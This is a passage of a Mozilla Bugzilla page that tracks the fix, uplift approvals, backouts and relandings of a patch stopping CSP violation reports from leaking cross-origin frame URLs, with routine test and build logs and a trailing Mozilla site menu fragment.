[Attachment #9310389](/attachment.cgi?id=9310389&action=edit "Bug 1790345 - Strip cross-origin URIs in frame-src CSP reports. r?freddyb") -
Flags: sec-approval? → sec-approval+

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1790345#c18)• 2 years ago |
|  | |

I will have to investigate how difficult it would be to do something similar like <https://hg.mozilla.org/integration/autoland/rev/70b37777bc92> for ESR102.

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1790345#c19)• 2 years ago |
|  | |

Attached file
[Bug 1790345 - ESR102: Introduce effective directive. r?freddyb](attachment.cgi?id=9313224)
— [Details](attachment.cgi?id=9313224&action=edit)

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1790345#c20)• 2 years ago |
|  | |

Attached file
[Bug 1790345 - ESR102: Strip cross-origin URIs in frame-src CSP reports. r?freddyb](attachment.cgi?id=9313225)
— [Details](attachment.cgi?id=9313225&action=edit)

Depends on D167365

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1790345#c21)• 2 years ago |
|  | |

Comment on [attachment 9313225](/attachment.cgi?id=9313225 "Bug 1790345 - ESR102: Strip cross-origin URIs in frame-src CSP reports. r?freddyb") [[details]](/attachment.cgi?id=9313225&action=edit "Bug 1790345 - ESR102: Strip cross-origin URIs in frame-src CSP reports. r?freddyb")

[Bug 1790345](/show_bug.cgi?id=1790345 "RESOLVED FIXED - CSP violation report can be made to leak cross origin information from embedded page (bypassing SOP)") - ESR102: Strip cross-origin URIs in frame-src CSP reports. r?freddyb

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**:
* **User impact if declined**:
* **Fix Landed on Version**:
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**:
[Attachment #9313225](/attachment.cgi?id=9313225&action=edit "Bug 1790345 - ESR102: Strip cross-origin URIs in frame-src CSP reports. r?freddyb") -
Flags: approval-mozilla-esr102?

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a11511215_703078)• 2 years ago |

[Attachment #9313224](/attachment.cgi?id=9313224&action=edit "Bug 1790345 - ESR102: Introduce effective directive. r?freddyb") -
Flags: approval-mozilla-esr102?

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1790345#c22)• 2 years ago |
|  | |

OH wait, maybe that should have been sec approval.

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1790345#c23)• 2 years ago |
|  | |

Comment on [attachment 9313224](/attachment.cgi?id=9313224 "Bug 1790345 - ESR102: Introduce effective directive. r?freddyb") [[details]](/attachment.cgi?id=9313224&action=edit "Bug 1790345 - ESR102: Introduce effective directive. r?freddyb")

[Bug 1790345](/show_bug.cgi?id=1790345 "RESOLVED FIXED - CSP violation report can be made to leak cross origin information from embedded page (bypassing SOP)") - ESR102: Introduce effective directive. r?freddyb

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: See [comment 16](/show_bug.cgi?id=1790345#c16 "RESOLVED FIXED - CSP violation report can be made to leak cross origin information from embedded page (bypassing SOP)").
* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: Yes
* **Which older supported branches are affected by this flaw?**:
* **If not all supported branches, which bug introduced the flaw?**: None
* **Do you have backports for the affected branches?**: Yes
* **If not, how different, hard to create, and risky will they be?**:
* **How likely is this patch to cause regressions; how much testing does it need?**:
* **Is Android affected?**: Yes
[Attachment #9313224](/attachment.cgi?id=9313224&action=edit "Bug 1790345 - ESR102: Introduce effective directive. r?freddyb") -
Flags: approval-mozilla-esr102? → sec-approval?

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a11511289_703078)• 2 years ago |

[Attachment #9313225](/attachment.cgi?id=9313225&action=edit "Bug 1790345 - ESR102: Strip cross-origin URIs in frame-src CSP reports. r?freddyb") -
Flags: sec-approval?

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1790345#c24)• 2 years ago |
|  | |

Comment on [attachment 9313225](/attachment.cgi?id=9313225 "Bug 1790345 - ESR102: Strip cross-origin URIs in frame-src CSP reports. r?freddyb") [[details]](/attachment.cgi?id=9313225&action=edit "Bug 1790345 - ESR102: Strip cross-origin URIs in frame-src CSP reports. r?freddyb")

[Bug 1790345](/show_bug.cgi?id=1790345 "RESOLVED FIXED - CSP violation report can be made to leak cross origin information from embedded page (bypassing SOP)") - ESR102: Strip cross-origin URIs in frame-src CSP reports. r?freddyb

Approved to request uplift and land

[Attachment #9313225](/attachment.cgi?id=9313225&action=edit "Bug 1790345 - ESR102: Strip cross-origin URIs in frame-src CSP reports. r?freddyb") -
Flags: sec-approval? → sec-approval+

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1790345#c25)• 2 years ago |
|  | |

Comment on [attachment 9313224](/attachment.cgi?id=9313224 "Bug 1790345 - ESR102: Introduce effective directive. r?freddyb") [[details]](/attachment.cgi?id=9313224&action=edit "Bug 1790345 - ESR102: Introduce effective directive. r?freddyb")

[Bug 1790345](/show_bug.cgi?id=1790345 "RESOLVED FIXED - CSP violation report can be made to leak cross origin information from embedded page (bypassing SOP)") - ESR102: Introduce effective directive. r?freddyb

Approved to request uplift and land

[Attachment #9313224](/attachment.cgi?id=9313224&action=edit "Bug 1790345 - ESR102: Introduce effective directive. r?freddyb") -
Flags: sec-approval? → sec-approval+

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1790345#c26)• 2 years ago |
|  | |

I think we should be ready now to land?

Flags: needinfo?(tom)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1790345#c27)• 2 years ago |
|  | |

The last uplifts are Feb 2; so I think that yes, we can land this, unless you are concerned about it not being approved for uplift, in which case check with relman before landing.

Flags: needinfo?(tom)

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a12101321_703078)• 2 years ago |

[status-firefox109](/buglist.cgi?f1=cf_status_firefox109&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox109&o1=equals&v1=affected)
[status-firefox110](/buglist.cgi?f1=cf_status_firefox110&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox110&o1=equals&v1=affected)
[status-firefox111](/buglist.cgi?f1=cf_status_firefox111&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox111&o1=equals&v1=affected)
[status-firefox-esr102](/buglist.cgi?f1=cf_status_firefox_esr102&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=affected)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1790345#c28)• 2 years ago |
|  | |

Landed:

<https://hg.mozilla.org/integration/autoland/rev/377f28cf90f0675b6b1e65e9563c10b505935f97>

Backed out for causing failures with test\_blocked\_uri\_redirect\_frame\_src.html

<https://hg.mozilla.org/integration/autoland/rev/3bad7be06ddac4ae238720bff307a56d3a5582fc>

[Push with failures](https://treeherder.mozilla.org/jobs?repo=autoland&group_state=expanded&selectedTaskRun=DuoUL8CBR7aEJPXC5UGeHw.0&resultStatus=testfailed%2Cbusted%2Cexception%2Cretry%2Cusercancel&revision=377f28cf90f0675b6b1e65e9563c10b505935f97)

[Failure log](https://treeherder.mozilla.org/logviewer?job_id=403952182&repo=autoland)

```
[task 2023-01-30T12:26:04.364Z] 12:26:04     INFO - TEST-START | dom/security/test/csp/test_blocked_uri_redirect_frame_src.html
[task 2023-01-30T12:26:04.496Z] 12:26:04     INFO - TEST-INFO | started process screentopng
[task 2023-01-30T12:26:05.186Z] 12:26:05     INFO - TEST-INFO | screentopng: exit 0
[task 2023-01-30T12:26:05.187Z] 12:26:05     INFO - TEST-UNEXPECTED-FAIL | dom/security/test/csp/test_blocked_uri_redirect_frame_src.html | Incorrect blocked-uri - got "http://example.com", expected "http://example.com/tests/dom/security/test/csp/file_blocked_uri_redirect_frame_src_server.sjs?doredirect"
[task 2023-01-30T12:26:05.188Z] 12:26:05     INFO -     SimpleTest.is@SimpleTest/SimpleTest.js:487:14
[task 2023-01-30T12:26:05.189Z] 12:26:05     INFO -     ml@dom/security/test/csp/test_blocked_uri_redirect_frame_src.html:40:7

```
Flags: needinfo?(tschuster)

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1790345#c29)• 2 years ago |
|  | |

Sorry, I updated the test and landed again.

<https://hg.mozilla.org/integration/autoland/rev/a4565e1b327c15be0baabaf4071d141be330fe0a>

Flags: needinfo?(tschuster)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=1790345#c30)• 2 years ago |
|  | |

<https://hg.mozilla.org/mozilla-central/rev/a4565e1b327c>

Group: dom-core-security → core-security-releaseStatus: ASSIGNED → RESOLVEDClosed: 2 years ago
[status-firefox111](/buglist.cgi?f1=cf_status_firefox111&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox111&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox111&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → 111 Branch

|  | [BugBot [:suhaib / :marco/ :calixte]](/user_profile?user_id=575867) |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=1790345#c31)• 2 years ago |
|  | |

The patch landed in nightly and beta is affected.

:tschuster, is this bug important enough to require an uplift?

* If yes, please nominate the patch for beta approval.
* If no, please set `status-firefox110` to `wontfix`.

For more information, please visit [auto\_nag documentation](https://wiki.mozilla.org/Release_Management/autonag#uplift_beta.py).

Flags: needinfo?(tschuster)

|  | [Donal Meehan [:dmeehan]](/user_profile?user_id=695136) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a12192012_695136)• 2 years ago |

[tracking-firefox110](/buglist.cgi?f1=cf_tracking_firefox110&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox110&o1=equals&v1=%2B)
[tracking-firefox111](/buglist.cgi?f1=cf_tracking_firefox111&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox111&o1=equals&v1=%2B)
[tracking-firefox-esr102](/buglist.cgi?f1=cf_tracking_firefox_esr102&o1=isnotempty):
--- → [110+](/buglist.cgi?f1=cf_tracking_firefox_esr102&o1=equals&v1=110%2B)

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=1790345#c32)• 2 years ago |
|  | |

Comment on [attachment 9310389](/attachment.cgi?id=9310389 "Bug 1790345 - Strip cross-origin URIs in frame-src CSP reports. r?freddyb") [[details]](/attachment.cgi?id=9310389&action=edit "Bug 1790345 - Strip cross-origin URIs in frame-src CSP reports. r?freddyb")

[Bug 1790345](/show_bug.cgi?id=1790345 "RESOLVED FIXED - CSP violation report can be made to leak cross origin information from embedded page (bypassing SOP)") - Strip cross-origin URIs in frame-src CSP reports. r?freddyb

### Beta/Release Uplift Approval Request

* **User impact if declined**: XSS URL leakage
* **Is this code covered by automated tests?**: Yes
* **Has the fix been verified in Nightly?**: Yes
* **Needs manual test from QE?**: No
* **If yes, steps to reproduce**:
* **List of other uplifts needed**: None
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**:
* **String changes made/needed**:
* **Is Android affected?**: Yes
Flags: needinfo?(tschuster)
[Attachment #9310389](/attachment.cgi?id=9310389&action=edit "Bug 1790345 - Strip cross-origin URIs in frame-src CSP reports. r?freddyb") -
Flags: approval-mozilla-beta?

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a12196167_703078)• 2 years ago |

[Attachment #9310641](/attachment.cgi?id=9310641&action=edit "Bug 1790345 - Add WPT for censored cross-origin URI in CSP report. r?freddyb") -
Flags: approval-mozilla-beta?

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a12196168_703078)• 2 years ago |

[Attachment #9313224](/attachment.cgi?id=9313224&action=edit "Bug 1790345 - ESR102: Introduce effective directive. r?freddyb") -
Flags: approval-mozilla-beta?
[Attachment #9313225](/attachment.cgi?id=9313225&action=edit "Bug 1790345 - ESR102: Strip cross-origin URIs in frame-src CSP reports. r?freddyb") -
Flags: approval-mozilla-beta?

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a12196179_703078)• 2 years ago |

[Attachment #9310641](/attachment.cgi?id=9310641&action=edit "Bug 1790345 - Add WPT for censored cross-origin URI in CSP report. r?freddyb") -
Flags: approval-mozilla-beta?

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a12196188_703078)• 2 years ago |

[Attachment #9313224](/attachment.cgi?id=9313224&action=edit "Bug 1790345 - ESR102: Introduce effective directive. r?freddyb") -
Flags: approval-mozilla-beta?

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a12196198_703078)• 2 years ago |

[Attachment #9313225](/attachment.cgi?id=9313225&action=edit "Bug 1790345 - ESR102: Strip cross-origin URIs in frame-src CSP reports. r?freddyb") -
Flags: approval-mozilla-beta?

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=1790345#c33)• 2 years ago |
|  | |

Comment on [attachment 9313224](/attachment.cgi?id=9313224 "Bug 1790345 - ESR102: Introduce effective directive. r?freddyb") [[details]](/attachment.cgi?id=9313224&action=edit "Bug 1790345 - ESR102: Introduce effective directive. r?freddyb")

[Bug 1790345](/show_bug.cgi?id=1790345 "RESOLVED FIXED - CSP violation report can be made to leak cross origin information from embedded page (bypassing SOP)") - ESR102: Introduce effective directive. r?freddyb

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**:
* **User impact if declined**:
* **Fix Landed on Version**:
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**:
[Attachment #9313224](/attachment.cgi?id=9313224&action=edit "Bug 1790345 - ESR102: Introduce effective directive. r?freddyb") -
Flags: approval-mozilla-esr102?

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a12196220_703078)• 2 years ago |

[Attachment #9310389](/attachment.cgi?id=9310389&action=edit "Bug 1790345 - Strip cross-origin URIs in frame-src CSP reports. r?freddyb") -
Flags: approval-mozilla-esr102?
[Attachment #9310641](/attachment.cgi?id=9310641&action=edit "Bug 1790345 - Add WPT for censored cross-origin URI in CSP report. r?freddyb") -
Flags: approval-mozilla-esr102?

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a12196231_703078)• 2 years ago |

[Attachment #9310389](/attachment.cgi?id=9310389&action=edit "Bug 1790345 - Strip cross-origin URIs in frame-src CSP reports. r?freddyb") -
Flags: approval-mozilla-esr102?

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a12196242_703078)• 2 years ago |

[Attachment #9310641](/attachment.cgi?id=9310641&action=edit "Bug 1790345 - Add WPT for censored cross-origin URI in CSP report. r?freddyb") -
Flags: approval-mozilla-esr102?

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=1790345#c34)• 2 years ago |
|  | |

Comment on [attachment 9310389](/attachment.cgi?id=9310389 "Bug 1790345 - Strip cross-origin URIs in frame-src CSP reports. r?freddyb") [[details]](/attachment.cgi?id=9310389&action=edit "Bug 1790345 - Strip cross-origin URIs in frame-src CSP reports. r?freddyb")

[Bug 1790345](/show_bug.cgi?id=1790345 "RESOLVED FIXED - CSP violation report can be made to leak cross origin information from embedded page (bypassing SOP)") - Strip cross-origin URIs in frame-src CSP reports. r?freddyb

Approved for 110 beta 8, thanks.

[Attachment #9310389](/attachment.cgi?id=9310389&action=edit "Bug 1790345 - Strip cross-origin URIs in frame-src CSP reports. r?freddyb") -
Flags: approval-mozilla-beta? → approval-mozilla-beta+

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=1790345#c35)• 2 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/251af9d31cde>

[status-firefox110](/buglist.cgi?f1=cf_status_firefox110&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox110&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox110&o1=equals&v1=fixed)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a12216484_1689)• 2 years ago |

Flags: sec-bounty? → sec-bounty+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a12216948_75935)• 2 years ago |

[status-firefox109](/buglist.cgi?f1=cf_status_firefox109&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox109&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox109&o1=equals&v1=wontfix)

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=1790345#c36)• 2 years ago |
|  | |

Comment on [attachment 9313224](/attachment.cgi?id=9313224 "Bug 1790345 - ESR102: Introduce effective directive. r?freddyb") [[details]](/attachment.cgi?id=9313224&action=edit "Bug 1790345 - ESR102: Introduce effective directive. r?freddyb")

[Bug 1790345](/show_bug.cgi?id=1790345 "RESOLVED FIXED - CSP violation report can be made to leak cross origin information from embedded page (bypassing SOP)") - ESR102: Introduce effective directive. r?freddyb

Approved for ESR 102.8.0, thanks.

[Attachment #9313224](/attachment.cgi?id=9313224&action=edit "Bug 1790345 - ESR102: Introduce effective directive. r?freddyb") -
Flags: approval-mozilla-esr102? → approval-mozilla-esr102+

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a12362869_24572)• 2 years ago |

[Attachment #9313225](/attachment.cgi?id=9313225&action=edit "Bug 1790345 - ESR102: Strip cross-origin URIs in frame-src CSP reports. r?freddyb") -
Flags: approval-mozilla-esr102? → approval-mozilla-esr102+

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=1790345#c37)• 2 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-esr102/rev/a4db1e8f8261>

<https://hg.mozilla.org/releases/mozilla-esr102/rev/965a208b3cdd>

[status-firefox-esr102](/buglist.cgi?f1=cf_status_firefox_esr102&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=fixed)

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=1790345#c38)• 2 years ago |
| backout uplift | |

Backed out changeset a4db1e8f8261 ([Bug 1790345](/show_bug.cgi?id=1790345 "RESOLVED FIXED - CSP violation report can be made to leak cross origin information from embedded page (bypassing SOP)")) for build bustage a=pascalc

<https://hg.mozilla.org/releases/mozilla-esr102/rev/8e52cd0ec19730700c5e5c74bf0a7167180d8bb4>

<https://hg.mozilla.org/releases/mozilla-esr102/rev/be907cae5b8a0ddf340a5d4bec6dd5c6ff1027d8>

Tom, I believe these are the cause of the build bustage on esr102, could you have a look please?

<https://treeherder.mozilla.org/logviewer?job_id=404339438&repo=mozilla-esr102>

Thanks

[status-firefox-esr102](/buglist.cgi?f1=cf_status_firefox_esr102&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=fixed) → [affected](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=affected)Flags: needinfo?(tschuster)

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=1790345#c39)• 2 years ago |
|  | |

Seems like only the Windows compiler detected the inconsistent order of fields/initialization. I've fixed it by reordering.

```
dom/security/nsCSPContext.cpp(1436,9): error: field 'mViolatedDirective' will be initialized after field 'mEffectiveDirective' [-Werror,-Wreorder-ctor]
  mViolatedDirective(aViolatedDirective),
  ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  mEffectiveDirective(aEffectiveDirective)

```
Flags: needinfo?(tschuster)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=1790345#c40)• 2 years ago |
|  | |

Tried to land the updated patches but hit xpcshell failures:

<https://treeherder.mozilla.org/logviewer?job_id=404541761&repo=mozilla-esr102&lineNumber=4116>

```
Assertion failure: false (MOZ_ASSERT_UNREACHABLE: dead code), at /builds/worker/checkouts/gecko/dom/security/nsCSPContext.cpp:843
#01: nsCSPContext::LogViolationDetails(unsigned short, mozilla::dom::Element*, nsICSPEventListener*, nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, int, int, nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&)
#02: ???
#03: CallMethodHelper::Call()
#04: XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode)
#05: XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*)
#06: CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), js::CallReason, JS::CallArgs const&)
#07: js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct, js::CallReason)
#08: Interpret(JSContext*, js::RunState&)
#09: js::RunScript(JSContext*, js::RunState&)
#10: js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct, js::CallReason)
#11: js::jit::DoCallFallback(JSContext*, js::jit::BaselineFrame*, js::jit::ICFallbackStub*, unsigned int, JS::Value*, JS::MutableHandle<JS::Value>)
#12: ??? (???:???)

```
Flags: needinfo?(tschuster)

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=1790345#c41)• 2 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1790345&comment_id=16266435 "1 revision") |
|  | |

Sorry. I am really not doing a good job working with esr102. We had already fixed the test in [bug 1778975](/show_bug.cgi?id=1778975 "RESOLVED FIXED - nsCSPContext::LogViolationDetails has a lot of unused code"), but that obviously isn't in esr102 either. Please reland.

Flags: needinfo?(tschuster)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 42](/show_bug.cgi?id=1790345#c42)• 2 years ago |
| uplift | |

Third time's the charm ;-)

<https://hg.mozilla.org/releases/mozilla-esr102/rev/1e098ecf9e8d>

<https://hg.mozilla.org/releases/mozilla-esr102/rev/4949c8f79bd5>

[status-firefox-esr102](/buglist.cgi?f1=cf_status_firefox_esr102&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=fixed)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 43](/show_bug.cgi?id=1790345#c43)• 2 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9317083)
— [Details](attachment.cgi?id=9317083&action=edit)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a13070908_578488)• 2 years ago |

Whiteboard: [reporter-external] [client-bounty-form] [verif?][domsecurity-active] → [reporter-external] [client-bounty-form] [verif?][domsecurity-active][adv-main110+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a13072723_578488)• 2 years ago |

Whiteboard: [reporter-external] [client-bounty-form] [verif?][domsecurity-active][adv-main110+] → [reporter-external] [client-bounty-form] [verif?][domsecurity-active][adv-main110+][adv-esr102.8+]

|  | [June Wilde (she/her) [:jewilde]](/user_profile?user_id=626341) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a13345120_626341)• 2 years ago |

Alias: CVE-2023-25728

|  | [Mihai Boldan, Desktop QA [:mboldan]](/user_profile?user_id=551058) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a15109385_551058)• 2 years ago |

QA Whiteboard: [post-critsmash-triage]

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a34621275_1689)• 1 year ago |

Group: core-security-release

|  | [Pulsebot](/user_profile?user_id=510726) |  |
| --- | --- | --- |
| [Comment 44](/show_bug.cgi?id=1790345#c44)• 1 year ago |
|  | |

Pushed by tschuster@mozilla.com:
<https://hg.mozilla.org/integration/autoland/rev/5cb45c939603>
Add WPT for censored cross-origin URI in CSP report. r=freddyb

|  | [Cristian Tuns](/user_profile?user_id=689658) |  |
| --- | --- | --- |
| [Comment 45](/show_bug.cgi?id=1790345#c45)• 1 year ago |
| bugherder | |

<https://hg.mozilla.org/mozilla-central/rev/5cb45c939603>

|  | [Web Platform Test Sync Bot [:wpt-sync] (Matrix: #interop:mozilla.org)](/user_profile?user_id=611017) |  |
| --- | --- | --- |
| [Comment 46](/show_bug.cgi?id=1790345#c46)• 1 year ago |
|  | |

Created web-platform-tests PR <https://github.com/web-platform-tests/wpt/pull/42821> for changes under testing/web-platform/tests

|  | [Web Platform Test Sync Bot [:wpt-sync] (Matrix: #interop:mozilla.org)](/user_profile?user_id=611017) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a35506378_611017)• 1 year ago |

Whiteboard: [reporter-external] [client-bounty-form] [verif?][domsecurity-active][adv-main110+][adv-esr102.8+] → [reporter-external] [client-bounty-form] [verif?][domsecurity-active][adv-main110+][adv-esr102.8+], [wptsync upstream]

|  | [Web Platform Test Sync Bot [:wpt-sync] (Matrix: #interop:mozilla.org)](/user_profile?user_id=611017) |  |
| --- | --- | --- |
| [Comment 47](/show_bug.cgi?id=1790345#c47)• 1 year ago |
|  | |

Upstream PR merged by moz-wptsync-bot

|  | [Web Platform Test Sync Bot [:wpt-sync] (Matrix: #interop:mozilla.org)](/user_profile?user_id=611017) |  |
| --- | --- | --- |
| [Comment 48](/show_bug.cgi?id=1790345#c48)• 1 year ago |
|  | |

Upstream PR was closed without merging

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a54113081_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1790345&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Tom Schuster](/user_profile?user_id=703078)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from www.mozilla.org_ecd4389d_20250115_091631.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
